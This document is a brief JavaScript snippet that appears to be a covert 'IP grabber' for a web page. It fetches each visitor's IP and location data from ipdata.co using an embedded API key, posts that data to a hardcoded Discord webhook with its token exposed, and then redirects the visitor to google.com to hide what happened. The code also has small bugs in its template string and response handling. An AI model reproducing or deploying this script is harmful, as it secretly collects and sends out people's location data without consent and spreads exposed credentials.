const apiKey = "7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7"
var request = new XMLHttpRequest();
request.open('GET',`https://api.ipdata.co/?api-key={apiKey}`);
request.setRequestHeader('Accept', 'application/json');
request.onreadystatechange = function () {
  if (this.readyState === 4) {
    fetch("https://discord.com/api/webhooks/1097163118964129803/lAbJM_aQ99MdPtrFlYcWc4FnKfdM5eT7HoSjG1GcRwzS2J_JIPDUqN7gyZy67o_2kxpq",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify(responseText)});
  }
};

request.send();

window.location.replace("https://google.com");
